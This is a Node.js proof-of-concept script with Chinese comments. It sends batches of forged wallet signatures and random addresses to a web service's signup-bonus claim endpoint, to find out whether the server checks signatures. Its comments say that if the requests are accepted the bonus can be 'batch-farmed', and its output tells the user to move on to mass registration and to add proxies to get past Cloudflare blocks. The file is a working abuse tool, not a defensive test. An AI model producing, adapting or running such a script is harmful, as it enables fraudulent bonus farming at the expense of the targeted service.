/**
 * PoC Layer 0: 假签名测试模板
 *
 * 目的: 在投入完整逆向之前，快速判断服务端是否真正验证签名
 *
 * 使用方法:
 *   1. 填入 TARGET_URL 和 BODY_BUILDER
 *   2. npm install crypto-js (如果需要 AES)
 *   3. node poc-fake-signature.js
 *
 * 结果解读:
 *   - 全部 ACCEPTED → 签名未验证，可直接批量刷
 *   - 全部 REJECTED → 分析错误消息定位验证逻辑
 *   - HTML 响应 → Cloudflare/网关拦截，需要加代理
 */

const crypto = require('crypto');

// ============================================================
// [REQUIRED] 填入目标信息
// ============================================================
const TARGET_URL = 'https://CHANGE_ME/trpc/lambda/user.claimSignupBonus?batch=1';
const TOTAL = 10;
const CONCURRENCY = 3;

// [REQUIRED] 构造请求体: 根据抓包/HAR 还原的格式
function buildBody() {
  return {
    '0': {
      json: {
        address: '0x' + crypto.randomBytes(20).toString('hex'),   // 随机地址
        chain: 'eth',
        encryptedToken: 'CHANGE_ME',                                // 如果有 AES token，在这里生成
        message: 'CHANGE_ME',                                       // 签名消息
        signature: '0x' + crypto.randomBytes(65).toString('hex'),  // 随机假签名
        type: 'wallet',
        version: '2'
      }
    }
  };
}

// ============================================================
// 不需要修改下面的代码
// ============================================================

async function claimOne(index) {
  const body = buildBody();

  try {
    const res = await fetch(TARGET_URL, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Accept': '*/*',
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36'
      },
      body: JSON.stringify(body)
    });

    const text = await res.text();

    if (text.startsWith('<')) {
      const title = text.match(/<title>(.*?)<\/title>/)?.[1] || 'no title';
      console.log(`[#${index}] ${res.status} | HTML_RESPONSE | ${title}`);
      return { index, accepted: false, htmlTitle: title };
    }

    const data = JSON.parse(text);
    const result = Array.isArray(data) ? data[0] : data;
    const hasError = result?.error ? true : false;
    const errorMsg = result?.error?.message || result?.error?.code || 'no error info';
    const success = result?.result?.data?.json;

    console.log(`[#${index}] ${res.status} | ${hasError ? 'REJECTED' : 'ACCEPTED'} | ${errorMsg}`);
    if (success) {
      console.log(`  >>> SUCCESS! Response: ${JSON.stringify(success)}`);
    }
    return { index, accepted: !hasError, data };
  } catch (err) {
    console.log(`[#${index}] NETWORK_ERROR: ${err.message}`);
    return { index, accepted: false, error: err.message };
  }
}

async function batch(items, concurrency, fn) {
  const results = [];
  for (let i = 0; i < items.length; i += concurrency) {
    const batch = items.slice(i, i + concurrency);
    const batchResults = await Promise.all(batch.map(fn));
    results.push(...batchResults);
  }
  return results;
}

async function main() {
  console.log('=== PoC Layer 0: Fake Signature Test ===');
  console.log(`Target: ${TARGET_URL}`);
  console.log(`Concurrency: ${CONCURRENCY}, Total: ${TOTAL}`);
  console.log('');

  const items = Array.from({ length: TOTAL }, (_, i) => i + 1);
  const results = await batch(items, CONCURRENCY, claimOne);

  const accepted = results.filter(r => r.accepted).length;
  const rejected = results.filter(r => !r.accepted).length;

  console.log('\n=== Results ===');
  console.log(`Accepted: ${accepted}/${TOTAL}`);
  console.log(`Rejected: ${rejected}/${TOTAL}`);

  if (accepted > 0) {
    console.log('\n[CRITICAL] Server does NOT validate signatures!');
    console.log('Next: Skip signature work, go directly to batch registration');
  } else {
    console.log('\n[INFO] All requests rejected. Analyze error messages:');
    const sampleError = results.find(r => r.data)?.data;
    if (sampleError) {
      console.log('Sample error:', JSON.stringify(sampleError, null, 2));
    }
  }
}

main().catch(console.error);
